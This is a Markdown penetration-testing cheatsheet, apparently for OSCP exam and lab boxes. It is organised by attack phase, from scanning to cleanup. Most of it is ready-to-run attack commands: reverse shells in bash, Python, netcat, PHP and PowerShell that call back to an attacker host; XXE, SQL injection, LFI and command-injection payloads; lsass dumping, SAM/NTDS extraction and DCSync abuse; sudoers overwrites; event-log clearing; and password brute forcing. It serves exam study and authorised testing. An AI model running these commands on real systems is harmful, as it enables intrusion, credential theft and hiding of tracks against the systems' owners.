<!-- Growing document. Update this cheatsheet after every box or module. Add new commands under the phase where they belong. -->
<!-- Commands are drawn from the OSCP Command Appendix. Keep labels short and practical. -->
<!-- TODO --> <!-- Appendix coverage still to condense: whois, subfinder, sublist3r, dnsenum, cewl, patator, aquatone, Burp/ZAP launchers, aws, cloud_enum, pacu, jq, gitleaks, wsgidav, single-file, buffer-overflow generators, msfvenom payload generation, meterpreter session commands, Shellter, LXC, dirtypipe, logrotten, AppArmor, debugfs, screen, snap, pkexec, Windows Potato tools, AppLocker, DCSync, Mimikatz, VSS, Net-NTLM relay, CUPP, username-anarchy, MSSQL, Plink, Rpivot, Dnscat2, Ligolo-ng, ptunnel-ng, SocksOverRDP, and report helpers. -->
<!-- TODO --> <!-- Also condense remaining AD PowerShell helpers such as LDAPSearch, Get-DomainObjectACL, Set-DomainUserPassword, Add-DomainGroupMember, Invoke-DomainPasswordSpray, Invoke-CimMethod, and New-PSSession; remaining Windows helpers such as EoPLoadDriver, ExploitCapcom, Get-AppLockerPolicy, Get-LocalUser, Invoke-SessionGopher, msiexec, restic, and regsvr32; and remaining transfer helpers such as bitsadmin, IEX, Start-BitsTransfer, and Invoke-RestMethod. -->

# CTRL+F ANYTHING

## 1. RECON & PORT SCANNING

```bash
# Full TCP scan
sudo nmap -Pn -n -sT -p- --min-rate 5000 $BoxIP -oN nmap/${BoxName}_allports.txt

# Service and default-script scan
sudo nmap -sC -sV -p $Port $BoxIP -oA nmap/${BoxName}_services

# Common UDP ports
sudo nmap -sU --top-ports 100 $BoxIP -oN nmap/${BoxName}_udp.txt

# Scan selected web ports with HTTP scripts
nmap -p 80,443,8080,8443 --script http-* $BoxIP

# SMB checks
nmap -p 445 --script smb-vuln* $BoxIP
smbclient -N -L //$BoxIP
enum4linux -a $BoxIP
smbmap -H $BoxIP

# RPC and NFS
rpcclient -U "" -N $BoxIP
showmount -e $BoxIP
mount -t nfs $BoxIP:/export /mnt/nfs -o nolock

# SNMP
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt $BoxIP
snmpwalk -v2c -c public $BoxIP
snmp-check $BoxIP

# FTP and SMTP
ftp $BoxIP
nc $BoxIP 25
nikto -host http://$BoxIP -Tuning b
dig axfr $Domain @$BoxIP
dnsrecon -d $Domain -t std
smtp-user-enum -M RCPT -U $Userlist -D $Domain -t $BoxIP
```

<!-- TODO --> <!-- Add compact PostgreSQL and SNMP-specific service triage commands. -->

## 2. WEB ENUMERATION

```bash
# Fingerprint and headers
whatweb http://$BoxIP
curl -I http://$BoxIP
curl -s http://$BoxIP/robots.txt
curl -s http://$BoxIP/sitemap.xml

# Directories and parameters
gobuster dir -u http://$BoxIP -w $Wordlist -x php,html,txt
feroxbuster -u http://$BoxIP/ -w $Wordlist -x php,txt,html -t 40
ffuf -u http://$BoxIP/FUZZ -w $Wordlist
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://$BoxIP/index.php?FUZZ=test" -fs 0 -t 50 -s

# WordPress
wpscan --url http://$BoxIP --enumerate u,vp,vt

# Save a raw response
curl -s "http://$BoxIP/$Path" -o $ResponseFile

# Route requests through Burp
curl --proxy 127.0.0.1:8080 http://$BoxIP/$Path
```

<!-- TODO --> <!-- Add concise virtual-host and subdomain enumeration commands. -->

## 3. DEFAULT CREDS & AUTH TESTING

```bash
# HTTP form testing
curl -i -s -c $CookieFile -d "username=$Username&password=$Password" http://$BoxIP/
curl -i -s -b $CookieFile -c $CookieFile -L http://$BoxIP/home.php

# Properly encode special form values
curl -X POST --data-urlencode "username=$Username&password=$Password" http://$BoxIP/login.php

# SMB anonymous and authenticated checks
smbclient -N -L //$BoxIP
smbclient //$BoxIP/$Share -U "$Username%$Password"

# SSH and FTP authentication
ssh $Username@$BoxIP
ftp $BoxIP

# PostgreSQL default login
psql -h $BoxIP -p $Port -U postgres
mysql -u $Username -p$Password -h $BoxIP -P $Port
```

<!-- TODO --> <!-- Add application-specific default credential pairs when documented. -->

## 4. WEB VULNERABILITIES

### XXE

```bash
curl -s -b $CookieFile -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' \
  "http://${BoxIP}:${WebPort}/process.php"

# Windows file read
curl -s -b $CookieFile -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' \
  "http://${BoxIP}:${WebPort}/process.php"

# Extract an SSH key from a saved response
awk '/BEGIN OPENSSH PRIVATE KEY/,/END OPENSSH PRIVATE KEY/' $ResponseFile \
  | sed -e 's/^.*\(-----BEGIN OPENSSH PRIVATE KEY-----\)/\1/' \
        -e 's/\(-----END OPENSSH PRIVATE KEY-----\).*/\1/' > $KeyFile
chmod 600 $KeyFile
ssh-keygen -y -f $KeyFile
```

### SQLI

```bash
# Form value with special characters
curl -s -X POST --data-urlencode "username=' || 1=1#" -d "password=anything" -L http://$BoxIP/login.php

# Error, UNION, and time checks
curl -G "http://$BoxIP/$Path" --data-urlencode "id=1'"
curl -G "http://$BoxIP/$Path" --data-urlencode "id=1' UNION SELECT NULL,NULL-- -"
time curl -s -X POST "http://$BoxIP/$Path" -d "${Parameter}=1;SELECT SLEEP(5)#"
```

### SQLi database execution

```sql
CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text);
COPY (SELECT '') TO PROGRAM 'ping -c 4 $LocalIP';
COPY cmd_exec FROM PROGRAM '$Command';
SELECT * FROM cmd_exec;
DROP TABLE cmd_exec;
```

### LFI / RFI

```bash
# Preserve traversal characters
curl --path-as-is "http://$BoxIP/$Path?file=../../../../etc/passwd"
curl -s "http://$BoxIP/$Path?img=php://filter/convert.base64-encode/resource=$File" | base64 -d

# URL-encoded data wrapper payload
PAYLOAD=$(echo -n '<?php echo shell_exec("id"); ?>' | base64 -w0 | sed 's/+/%2B/g')
curl -s "http://$BoxIP/$Path?img=data://text/plain;base64,$PAYLOAD"
unzip -l $File
```

### FILE UPLOAD

```bash
curl -s -X POST "http://$BoxIP/$UploadPath" -F "file=@$File" -F "submit=Upload"
curl -s "http://$BoxIP/$UploadedPath"
```

### COMMAND INJECTION

```bash
curl -G "http://$BoxIP/$Path" --data-urlencode "cmd=id"
curl -G "http://$BoxIP/$Path" --data-urlencode "cmd=$Command"
```

<!-- TODO --> <!-- Add concise SSRF and IDOR command patterns. -->
<!-- TODO --> <!-- Add PostgreSQL COPY, MSSQL xp_cmdshell, MySQL file-write, and blind SQLi command patterns. -->

## 5. FOOTHOLD: PUBLIC EXPLOITS

```bash
# Search by product and version
searchsploit $Service $Version

# Read a matching exploit
searchsploit -x $ExploitPath
python3 $Exploit $BoxIP $Port $Command
perl $Exploit $BoxIP

# Copy an Exploit-DB entry directly
searchsploit -m $ExploitID
searchsploit -p $ExploitID
searchsploit -x $ExploitPath

# Compile a local C exploit
gcc $Exploit.c -o $Exploit
```

<!-- TODO --> <!-- Add service-specific manual exploit launch commands. -->
<!-- TODO --> <!-- Add service-specific Perl, Python, PHP, and compiled exploit launch commands. -->

## 6. FOOTHOLD: SHELLS & PAYLOADS

```bash
# Linux reverse shells
bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LocalIP",$Lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
nc -e /bin/sh $LocalIP $Lport
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LocalIP $Lport >/tmp/f
php -r '$s=fsockopen("$LocalIP",$Lport);exec("/bin/sh -i <&3 >&3 2>&3");'

# Listener and TTY upgrade
nc -lvnp $Lport
nc -lnvp $Lport
sudo nc -lvnp $Lport
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z, then: stty raw -echo; fg
export TERM=xterm
stty rows 50 columns 200

# Legacy SSH server
ssh -oHostKeyAlgorithms=ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -oMACs=+hmac-md5,hmac-sha1 $Username@$BoxIP

# Windows PowerShell reverse shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('$LocalIP',$Lport);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## 7. FILE TRANSFERS

### Linux to Windows

```bash
# Kali server
cd $BoxDir/www
python3 -m http.server $WebPort
wget http://$LocalIP/$File -O $File
```

```cmd
certutil -urlcache -split -f http://$LocalIP/$File $File
powershell -Command "Invoke-WebRequest -Uri http://$LocalIP/$File -OutFile $File"
```

### Windows to Linux

```bash
# Kali SMB server
mkdir /tmp/share
impacket-smbserver share /tmp/share -smb2support -username $Username -password $Password
```

```cmd
net use \\$LocalIP\share /user:$Username $Password
copy $File \\$LocalIP\share\$File
Copy-Item \\$LocalIP\share\$File C:\Users\$Username\Desktop\$File
Expand-Archive .\archive.zip -DestinationPath C:\Temp\$Directory -Force
Start-BitsTransfer -Source http://$LocalIP/$File -Destination C:\Temp\$File
```

### Raw Netcat Transfer

```bash
nc -lvnp $Lport < $File
nc -nv $BoxIP $Lport > $File
base64 -w0 $File
echo "$Encoded" | base64 -d > $File
```

## 8. POST-EXPLOITATION: LINUX

```bash
id
whoami
hostname
ip a
ss -lntp
ps aux
find / -type f -name '*.conf' 2>/dev/null
grep -RniE 'password|passwd|secret|token' /var/www /opt /home 2>/dev/null
cat /etc/passwd
cat /etc/shadow 2>/dev/null
mysql -u $Username -p$Password -h 127.0.0.1 -P $Port
psql -h 127.0.0.1 -p $Port -U $Username -d $Database
gcore $PID
sudo gcore $PID
strings core.$PID | grep -A 1 "Password:"
```

<!-- TODO --> <!-- Add concise Linux credential-hunting commands. -->
<!-- TODO --> <!-- Add linpeas, unix-privesc-check, routel, package checks, Docker/LXC, AppArmor, kernel module, and log abuse commands. -->

## 9. POST-EXPLOITATION: WINDOWS

```cmd
whoami /all
whoami /priv
whoami /groups
hostname
systeminfo
ipconfig /all
route print
netstat -ano
tasklist /v
net user
net localgroup
cmdkey /list
wevtutil qe Security /rd:true /f:text | Select-String password
procdump.exe -accepteula -ma lsass.exe lsass.dmp
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
findstr /si password *.txt *.xml *.config
reg query HKLM /f password /t REG_SZ /s
```

```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
Get-ChildItem C:\Users\ -Recurse -Include *.kdbx,*.rdg,*.vnc,*.rdp,*.cred,*.bak -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.log -ErrorAction SilentlyContinue | Select-String -Pattern "password","pass","secret"
cmdkey /list
```

## 10. PRIVILEGE ESCALATION: LINUX

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
cat /etc/passwd
cat /etc/shadow 2>/dev/null
uname -a
searchsploit linux kernel $Version
openssl passwd -1 -salt $Salt $Password
dosbox -c 'mount c /etc' -c 'echo $Username ALL=(ALL) NOPASSWD: ALL > c:\sudoers' -c 'exit'
bsdtar -xOf /var/cache/pacman/pkg/sudo-$Version-x86_64.pkg.tar.zst etc/sudoers > /etc/sudoers
./$Exploit
/tmp/rootbash -p
```

```bash
# Sudo escape examples
sudo find . -exec /bin/sh \; -quit
sudo python -c 'import pty; pty.spawn("/bin/bash")'
sudo vim -c ':!/bin/sh'
sudo less /etc/profile
!/bin/bash
```

<!-- TODO --> <!-- Add compact NFS, capabilities, writable configuration, UDF, and tar wildcard examples. -->
<!-- TODO --> <!-- Add debugfs, dirtypipe, logrotten, lxc, screen, snap, pkexec, Docker, and AppArmor commands. -->

## 11. PRIVILEGE ESCALATION: WINDOWS

```cmd
whoami /all
systeminfo
wmic service get name,displayname,pathname,startmode
sc.exe query type= all state= all
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"
icacls "C:\Path\to\service.exe"
sc.exe stop $ServiceName
sc.exe start $ServiceName
```

```powershell
Get-UnquotedService
Get-CimInstance -Class Win32_Service | Where-Object {$_.PathName -match ' ' -and $_.PathName -notmatch '"'} | Select-Object Name,PathName
Get-ModifiableServiceFile
Get-ModifiableService
Get-ScheduledTask | Select-Object TaskName,@{N="Binary";E={$_.Actions.Execute}},@{N="User";E={$_.Principal.UserId}}
Get-ScheduledTaskInfo -TaskName $TaskName
icacls "C:\Path\to\task-script.bat"
wevtutil qe Security /rd:true /f:text | Select-String user
wevtutil.exe cl $LogName
takeown /f "C:\Path\to\file.txt"
accesschk.exe -accepteula -w \\pipe\* -v
```

```cmd
copy /Y C:\Users\$Username\payload.bat C:\Path\to\task-script.bat
net localgroup administrators $Username /add

# Server Operators service binary-path abuse
sc.exe qc $ServiceName
sc.exe config $ServiceName binPath= "cmd.exe /c <command>"
sc.exe config $ServiceName binPath= "C:\Windows\system32\<original>.exe"
sc.exe qc $ServiceName
net localgroup administrators $Username /delete
```

<!-- TODO --> <!-- Add concise token, DLL hijack, registry, AlwaysInstallElevated, and named-pipe branches. -->

## 12. ACTIVE DIRECTORY

```bash
# LDAP and domain discovery
ldapsearch -x -H ldap://$BoxIP -b "dc=$Domain"
kerbrute userenum -d $Domain --dc $BoxIP $Userlist
impacket-GetNPUsers $Domain/ -usersfile $Userlist -format john
impacket-GetUserSPNs $Domain/$Username:$Password -request

# BloodHound collection
bloodhound-python -d $Domain -u $Username -p $Password -ns $BoxIP -c all

# SMB checks and pass the hash
netexec smb $BoxIP -u $Username -p $Password --shares
impacket-psexec -hashes $LMHash:$NTHash $Username@$BoxIP
evil-winrm -i $BoxIP -u $Username -p $Password
```

```powershell
Get-NetDomain
Get-NetDomainController
Get-DomainUser | select samaccountname,lastlogon
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
Get-DomainTrustMapping
Find-DomainShare -CheckShareAccess
```

+```powershell
# Check stored Windows autologon credentials
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword

# PowerShell equivalent of dir /a
Get-ChildItem -Force
```

+<!-- TODO --> <!-- Remaining AD coverage: delegation and ticket-forging commands. -->

```bash
# Compare anonymous RPC and LDAP user enumeration
rpcclient -U '' -N $BoxIP -c 'enumdomusers'
ldapsearch -x -H ldap://$BoxIP -b "DC=htb,DC=local" '(&(objectCategory=person)(objectClass=user))' sAMAccountName
windapsearch -d $Domain --dc-ip $BoxIP -U

# AS-REP roast and crack
impacket-GetNPUsers $Domain/ -dc-ip $BoxIP -usersfile $Userlist -no-pass -request -format hashcat -outputfile $LootDir/asrep.txt
hashcat -m 18200 $LootDir/asrep.txt $Wordlist
```

```bash
# Account Operators path: create a user, add it to the delegated Exchange group
netexec winrm $BoxIP -u $Username -p $Password -d $Domain -X "net user $Username2 $Password2 /add /domain"
netexec winrm $BoxIP -u $Username -p $Password -d $Domain -X "net group \"Exchange Windows Permissions\" $Username2 /add /domain"

# Grant DCSync rights and dump NTDS when secretsdump is unreliable
bloodyAD -d $Domain -u $Username2 -p $Password2 -H $BoxIP -i $BoxIP add dcsync $Username2
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds

# Pass the hash to a domain account
netexec smb $BoxIP -u Administrator -H $NTHash -d $Domain
evil-winrm -i $BoxIP -u Administrator -H $NTHash
```

```bash
# LDAP passback from an editable server address field
nc -lvnp 389
curl -s -X POST --data "ip=$LocalIP" http://$BoxIP/settings.php
```

## 13. PASSWORD ATTACKS

```bash
# SSH, HTTP, and SMB password attacks
hydra -l $Username -P $Wordlist ssh://$BoxIP
hydra -l $Username -P $Wordlist http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
medusa -h $BoxIP -u $Username -P $Wordlist -M ssh -t 4
netexec smb $BoxIP -u $Username -p $Password --continue-on-success

# Hash identification and cracking
hashid $Hash
john --wordlist=$Wordlist $HashFile
hashcat -m 1000 -a 0 $HashFile $Wordlist
hashcat -m 5600 $HashFile $Wordlist
keepass2john $File > $HashFile
unshadow /etc/passwd /etc/shadow > $HashFile
office2john $File > $HashFile
bitlocker2john -i $File > $HashFile
lazagne.exe all
```

```bash
# SSH private key passphrase
ssh2john $KeyFile > $HashFile
john --wordlist=$Wordlist $HashFile
```

<!-- TODO --> <!-- Add concise Net-NTLM relay, KeePass, BitLocker, and MSSQL password attack commands. -->
<!-- TODO --> <!-- Add Net-NTLM relay, Mimikatz, VSS, username-anarchy, CUPP, and MSSQL command families. -->

## 14. PORT FORWARDING & PIVOTING

```bash
# SSH local, dynamic SOCKS, and remote forwarding
ssh -L $Lport:127.0.0.1:$Port $Username@$BoxIP
ssh -D $Lport $Username@$BoxIP
ssh -R $Lport:127.0.0.1:$Port $Username@$BoxIP
sshuttle -r $Username@$BoxIP:$Port $Subnet/24
netsh interface portproxy add v4tov4 listenport=$Lport listenaddress=$LocalIP connectport=$Port connectaddress=$InternalIP

# Chisel reverse tunnel
./chisel server -p $Port --reverse
./chisel client $LocalIP:$Port R:$Lport:$InternalIP:$InternalPort

# Socat forward
socat TCP-LISTEN:$Lport,fork TCP:$InternalIP:$InternalPort

# Use a SOCKS proxy for internal tools
proxychains -q $Command
```

<!-- TODO --> <!-- Add Ligolo-ng and Windows native port-forwarding commands. -->
<!-- TODO --> <!-- Add Ligolo-ng, Plink, Rpivot, Dnscat2, Meterpreter portfwd, ptunnel-ng, and SocksOverRDP commands. -->

## 15. CLEANUP

```bash
# Remove local payloads and temporary files
rm -f /tmp/$File
rm -f $BoxDir/www/$File
```

```cmd
# Remove target-side payloads
del C:\Users\$Username\$File
del C:\Windows\Temp\$File

# Restore a writable scheduled-task script from a saved copy
copy /Y C:\Users\$Username\job-original.bat C:\Path\to\task-script.bat
fc /b C:\Users\$Username\job-original.bat C:\Path\to\task-script.bat
```

```bash
# Verify a removed webshell returns 404
curl -s -o /dev/null -w "%{http_code}" http://$BoxIP/$Path
md5sum $File
```

<!-- TODO --> <!-- Add technique-specific restore commands for services, sudoers, registry hives, and databases. -->
